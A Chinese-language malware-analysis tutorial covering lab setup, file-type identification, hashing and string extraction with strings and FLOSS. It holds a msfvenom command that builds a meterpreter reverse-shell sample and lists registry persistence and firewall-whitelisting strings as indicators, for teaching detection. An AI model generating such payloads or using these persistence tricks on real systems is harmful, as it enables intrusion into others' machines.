@@ -1,0 +1,380 @@
+冰封三尺非一日之寒，本篇先交付恶意软件前置知识的文件类型与指纹识别，来帮助大家打基础。
+
+## 前置知识
+
+恶意软件分析的目标是了解恶意软件的工作方式以及如何检测和杀死它。
+
+恶意软件是一个广义的术语，指的是不同类型的恶意程序：
+
+> Virus or Worm（病毒或蠕虫）：自我复制，网络传播
+>
+> Trojan（特洛伊木马）
+>
+> Backdoor / Remote Access Trojan (RAT)（后门或远程访问木马）
+>
+> Adware（广告软件）：强制广告弹窗营销
+>
+>
+> Botnet（僵尸网络）：大量僵尸程序（bots）通过C2隧道等待攻击者执行DDOS或者其他恶意活动。nginx的出生就是因为大量僵尸程序需要回连控制端，而导致它被开发了出来。
+>
+> Information stealer（信息窃密者）：意指窃取银行等敏感数据的恶意软件，包括键盘记录器，表单抓取，间谍软件，嗅探器。
+>
+> Ransomware（勒索软件）：加密数据要挟赎金
+>
+> Rootkit：旨在表达隐蔽性很强的一种特权持久化后门
+>
+> Downloader or dropper（下载器或投放器）：类似于先来一个侦察兵，然后侦察兵再释放出真实的恶意程序。分阶段部署与交付恶意程序。
+
+包括但不限于恶意软件分析的基本术语表：https://blog.malwarebytes.com/glossary/
+
+恶意软件分析技术：
+
+> Static analysis（静态分析）：它表示的只是二进制文件在此刻所反映的反汇编等信息。也就是说还没执行时，它大概是个什么样子，有什么信息。
+>
+> Dynamic analysis (Behavioral Analysis) 动态分析（行为分析）:
+> 在隔离环境中执行可疑二进制文件并监控其行为的过程。动态分析结束意味着您真正的将恶意软件给执行了一遍。已调试的方式下一步下一步来观察。
+>
+> Code analysis （代码分析）
+>
+> Memory analysis (Memory forensics) 内存分析(内存取证)
+
+## 设置实验室环境
+
+VMware Workstation，VMware Fusion（mac os），VirtualBox
+
+共享文件夹
+
+https://www.virtualbox.org/manual/ch04.html#sharedfolders
+
+https://docs.vmware.com/en/VMware-Workstation-Pro/16.0/com.vmware.ws.using.doc/GUID-AACE0935-4B43-43BA-A935-FC71ABA17803.html
+
+禁用Windows Defender 避免对恶意样本产生干扰
+
+如果是很严重的一次恶意样本分析，则需要依赖一个复杂的实验室环境：有服务器，有客户端，有其他应用程序。您需要高仿真用户环境试图安慰恶意程序，让它放下戒心（过渡潜伏期与侦察期），执行自己的真实目的程序。
+
+![image](https://image.3001.net/images/20210724/1627119878_60fbe1064e4b7ba45948e.png!small)
+
+安全意识Tips：
+
+>
+> 虚拟环境需及时更新，采用多层套娃等提升环境复杂度（比如底层是云虚拟平台，再起主机，主机再起VirtualBox）：针对环境复杂度漏洞利用的恶意程序则需已全国之力来对付才行。。
+>
+> 网络隔离，host-only，仅主机模式
+>
+> 不要在物理机上连接可移动媒体
+>
+> 可以用linux环境来分析Windows 恶意软件，如果从虚拟机逃逸，也无法感染到主机。
+
+ubuntu环境下的一些推荐工具：
+
+http://releases.ubuntu.com/ ubuntu发行版，我们选择的是LTS版本，桌面版或者服务器版。
+
+    
+    
+    $ sudo apt-get update
+    $ sudo apt-get install python-pip
+    $ pip install --upgrade pip
+    $ sudo apt-get install python-magic
+    $ sudo apt-get install upx
+    $ sudo pip install pefile
+    $ sudo apt-get install yara
+    $ sudo pip install yara-python
+    $ sudo apt-get install ssdeep
+    $ sudo apt-get install build-essential libffi-dev python python-dev libfuzzy-dev
+    $ sudo pip install ssdeep
+    $ sudo apt-get install wireshark
+    $ sudo apt-get install tshark
+    
+
+INetSim (http://www.inetsim.org/index.html) 模拟恶意软件攻击的各种 Internet 服务（例如 DNS 和
+HTTP）。
+
+安装文档：http://www.inetsim.org/packages.html
+
+    
+    
+    $ sudo su
+    # echo "deb http://www.inetsim.org/debian/ binary/" > /etc/apt/sources.list.d/inetsim.list
+    # wget -O - http://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add -    # apt update
+    # apt-get install inetsim
+    
+
+设置静态IP地址
+
+ **$ sudo gedit /etc/network/interfaces**
+
+auto ens33
+
+iface ens33 inet static
+
+address 192.168.1.100
+
+netmask 255.255.255.0
+
+配置INetSim
+
+$ **sudo gedit /etc/inetsim/inetsim.conf**
+
+service_bind_address 192.168.1.100
+
+dns_default_ip 192.168.1.100
+
+验证INetSim是否在监听192.168.1.100
+
+$ **sudo inetsim**
+
+## 恶意样本
+
+Hybrid Analysis: https://www.hybrid-analysis.com/  
+KernelMode.info: http://www.kernelmode.info/forum/viewforum.php?f=16  
+VirusBay: https://beta.virusbay.io/  
+Contagio malware dump: http://contagiodump.blogspot.com/  
+AVCaesar: https://avcaesar.malware.lu/  
+Malwr: https://malwr.com/  
+VirusShare: https://virusshare.com/  
+theZoo: http://thezoo.morirt.com/
+
+https://zeltser.com/malware-sample-sources/
+
+## 静态分析之文件类型
+
+遇见可疑二进制文件时初始的分析方法是用静态分析，提取出有用的信息
+
+### 确定文件类型之文件后缀名
+
+确定可疑二进制文件的文件类型将帮助您识别恶意软件的目标操作系统（Windows、Linux 等）和体系结构（32 位或 64 位平台）。
+
+例如，如果可疑二进制文件的文件类型为Portable Executable (可移植可执行文件,PE)，这是 Windows
+可执行文件（.exe、.dll、.sys、.drv、.com、.ocx 等）的文件格式 ，那么您可以推断该文件旨在针对 Windows 操作系统。
+
+大多数基于 Windows 的恶意软件都是以 .exe、.dll、.sys
+等扩展名结尾的可执行文件。攻击者使用不同的技巧来隐藏他们的文件，通过修改文件扩展名并更改其外观来诱使用户执行它。
+可以使用文件签名来确定文件类型，而不是依赖于文件扩展名。
+
+### 确定文件类型之文件签名
+
+文件签名是写入文件头的唯一字节序列。 不同的文件有不同的签名，可以用来识别文件的类型。 Windows 可执行文件，也称为 PE 文件（例如以
+.exe、.dll、.com、.drv、.sys 等结尾的文件），文件签名为 MZ 或十六进制字符 4D 5A 文件的两个字节。
+
+http://www.filesignatures.net/
+
+![image](https://image.3001.net/images/20210724/1627119980_60fbe16cf00f515b1af0a.png!small)
+
+我们确切的发现了，与exe文件本质上一模一样的PE文件有很多个。
+
+![image](https://image.3001.net/images/20210724/1627119996_60fbe17c99eab868252ef.png!small)
+
+### 手动方法识别文件类型
+
+通过在十六进制编辑器中打开文件来查找文件签名。
+
+![image](https://image.3001.net/images/20210724/1627120013_60fbe18d05ccda035ed36.png!small)
+
+十六进制编辑器
+
+HxD hex editor (https://mh-nexus.de/en/hxd/)
+
+在linux下使用xxd工具查看十六进制（需要安装：yum install vim-common）
+
+    
+    
+    xxd exp.exe | more
+    
+
+![image](https://image.3001.net/images/20210724/1627120033_60fbe1a15d0b33ddb99fb.png!small)
+
+![image](https://image.3001.net/images/20210724/1627120047_60fbe1afec7e3c49c79fe.png!small)
+
+### 使用工具识别文件类型
+
+linux可以使用file命令
+
+    
+    
+    $file payload.exe
+    
+
+![image](https://image.3001.net/images/20210724/1627120065_60fbe1c115abaec4a9f85.png!small)
+
+windows中可以使用 Explorer Suite 软件包中的CFF Explorer工具
+
+http://www.ntcore.com/exsuite.php
+
+![image](https://image.3001.net/images/20210724/1627120212_60fbe25440fd262b8bb38.png!small)
+
+![image](https://image.3001.net/images/20210724/1627120227_60fbe2631dd197d3506b0.png!small)
+
+## 静态分析之恶意软件指纹识别
+
+### 指纹识别之哈希校验
+
+指纹识别旨在对可疑二进制文件的内容生成加密哈希值。
+
+请注意：基于文件内容的哈希，本身仅仅代表类似于身份的数字，需要使用它去“警局”查询【比如VirusTotal】是否有违法行为。但没查到不代表它就是正常，仅仅表示它暂时没有留下“案底”。另外，修改了文件内容中的任何一个比特，哈希身份将完全不同。它将完全已另一个身份登场。
+
+ **请注意：基于哈希校验的恶意软件识别是，是对已知恶意软件内容的一种数据匹配。修改一个bit之后，它将完全已另一个身份登场。**
+
+当然，您可以基于这里的原理思考一下cs多人运动工具的payload，包括它默认加载与调用的API函数等，如果您不修改的话，肯定有人已经找到它们并生成了指纹来查杀。
+
+可以参考此处，它们指纹识别了API函数的哈希 ：https://decoded.avast.io/threatintel/decoding-cobalt-strike-understanding-payloads/
+
+网站：VirusTotal https://www.virustotal.com/gui/
+
+$ md5sum log.exe  
+$ sha256sum log.exe  
+$ sha1sum log.exe
+
+![image](https://image.3001.net/images/20210724/1627120261_60fbe2854a9e0a986beb0.png!small)
+
+window HashMyFiles (http://www.nirsoft.net/utils/hash_my_files.html)
+
+python中的哈希 以下实战环境为kali
+
+    
+    
+    $ python
+    Python 2.7.12 (default, Nov 19 2016, 06:48:10)
+    >>> import hashlib
+    >>> content = open(r"log.exe","rb").read()
+    >>> print hashlib.md5(content).hexdigest()
+    6e4e030fbd2ee786e1b6b758d5897316
+    >>> print hashlib.sha256(content).hexdigest()
+    01636faaae739655bf88b39d21834b7dac923386d2b52efb4142cb278061f97f
+    >>> print hashlib.sha1(content).hexdigest()
+    625644bacf83a889038e4a283d29204edc0e9b65
+    
+
+![image](https://image.3001.net/images/20210724/1627120280_60fbe298ed6a8faf92e9a.png!small)
+
+pestudio (https://www.winitor.com/) 或PPEE (https://www.mzrst.com/)。
+加载二进制文件时，会自动从 VirusTotal 数据库中查询二进制文件的哈希值并显示结果，如下图所示：
+
+下载之后，记得验证一下哈希
+
+![image](https://image.3001.net/images/20210724/1627120352_60fbe2e0e4b1b600c06ea.png!small)
+
+![image](https://image.3001.net/images/20210724/1627120365_60fbe2edc7679bf4af1c0.png!small)
+
+## AV扫描资源推荐
+
+【请注意】如果反病毒扫描引擎未检测到可疑二进制文件，并不一定意味着可疑二进制文件是安全的。这些防病毒引擎依靠签名和启发式方法来检测恶意文件。
+
+恶意软件作者可以轻松修改他们的代码并使用混淆技术来绕过这些检测，这就是为什么需要依靠SOC，或者EDR等更多数据关联性上的平台和多维度的应急响应平台的机制。
+
+使用哈希值查询的理由：防止机密性的文件上传到公共平台中，尤其您是红队成员的话。
+
+> VirusTotal（http://www.virustotal.com）
+>
+> 哈勃 habo.qq.com
+>
+> 魔盾 https://maldun.com/
+>
+> 在线扫描仪，例如VirSCAN（http://www.virscan.org/)
+>
+> Jotti恶意软件扫描（https://virusscan.jotti.org/）
+>
+> OPSWAT的Metadefender（https://www.metadefender.com/#!/scan-file）
+>
+> 在线沙箱 https://app.any.run/
+>
+> 奇安信沙箱 https://sandbox.ti.qianxin.com/sandbox/page
+
+## 指纹识别之提取字符串
+
+攻防意识：字符串是嵌入文件中的 ASCII 和 Unicode
+可打印字符。恶意软件的编写会引入很多功能性上面的需求，比如文件行为，网络行为，进程行为，注册表行为等。这些行为中会引入字符串。您编写一个回连的IP地址，域名，注册表项等难道不需要使用字符串吗？字符串的提取就是旨在发现这些地方。
+
+您只有掌握了这里的意识之后，才会明白，好的字符串与坏的字符串等开源的资源（比如yara排除所有好的字符串资源）如何使用。
+
+例如，恶意软件创建了一个文件，文件名将作为字符串存储在二进制文件中。 或者，恶意软件解析了攻击者控制的域名，该域名存储为字符串。
+从二进制文件中提取的字符串可以包含对文件名、URL、域名、IP 地址、攻击命令、注册表项等的引用。
+
+pestudio (https://www.winitor.com/) 工具字符串提取
+
+![image](https://image.3001.net/images/20210724/1627120488_60fbe36866bd72a659b4d.png!small)
+
+使用strings检测msf的payload
+
+    
+    
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.236.129 LPORT=4444 -f exe > shell.exe
+    
+
+![image](https://image.3001.net/images/20210724/1627120534_60fbe396373ceef8dfe5e.png!small)
+
+    
+    
+    man strings 
+    注意-e 选项：l和b可以提取UTF字符串，但是b是大端，l是小端。默认是ASCII码
+    strings -a shell.exe
+    strings -a -el shell.exe   # 这里使用小端来看看，您可以使用每一种方式来看看
+    
+
+![image](https://image.3001.net/images/20210724/1627120573_60fbe3bddf28e39a14546.png!small)
+
+我们发现了msf释放的payload程序ab.exe（ apache benchmark），它是msfpayload的默认模板
+
+![image](https://image.3001.net/images/20210724/1627120587_60fbe3cb2e10e02403060.png!small)
+
+啊哈，我们还发现了payload程序的功能与参数选项，都打印了出来。
+
+![image](https://image.3001.net/images/20210724/1627120600_60fbe3d8ea22ae1949635.png!small)
+
+包括API调用也打印了出来。如果您想深入的看看API字符串的调用，可以参考以下威胁指标，观察一下。
+
+https://www.virustotal.com/gui/file/d8b87863c68d2da9bf62d7f029b8f2fda567f6a61e71a2bac0a3a390a765c0b3/details
+
+![image](https://image.3001.net/images/20210724/1627120640_60fbe40069994e83e97b2.png!small)
+
+注意恶意软件修改注册表持久化与添加防火墙白名单的技巧，它看起来像下面这样
+
+    
+    
+    Software\Microsoft\Windows\CurrentVersion\Run
+    netsh firewall add allowedprogram
+    
+
+其他工具
+
+由 Mark Russinovich 移植到 Windows 的字符串实用程序 (https://technet.microsoft.com/en-us/sysinternals/strings.aspx) 和 PPEE (https://www.mzrst.com/) 是一些可用于提取 ASCII 和
+Unicode 字符串的其他工具。
+
+## 指纹识别对抗之解码混淆的字符串
+
+使用FLOSS解码混淆后的字符串
+
+大多数时候，恶意软件作者使用简单的字符串混淆技术来避免检测。 这种情况下，字符串打印将无法看见。 FireEye
+Labs混淆字符串求解器（FLOSS），用于自动识别并从恶意软件中提取混淆字符串。 它可以帮助您确定恶意软件作者想要从字符串提取工具中隐藏的字符串。
+
+参考资料：https://www.fireeye.com/blog/threat-research/2016/06/automatically-extracting-obfuscated-strings.html
+
+软件包下载
+
+https://github.com/fireeye/flare-floss/releases
+
+使用手册
+
+https://github.com/fireeye/flare-floss/blob/master/doc/usage.md
+
+下载并解压，cmd开箱即用
+
+![image](https://image.3001.net/images/20210724/1627120679_60fbe427166a3f5f200b9.png!small)
+
+    
+    
+    floss.exe -h
+    floss.exe malware.bin
+    
+
+![image](https://image.3001.net/images/20210724/1627120696_60fbe43810a0fbc1b0508.png!small)
+
+关于字符串于恶意软件中的场景案例可以参考，DeadEye安全团队披露的：针对红队的供应链打击
+
+https://mp.weixin.qq.com/s/bFXsbQKpS3nMM-9ob2k-GQ
+
+感谢师傅们很有耐心的看到了这里。
+
+我们还会再见面的。
+
+共勉。
+
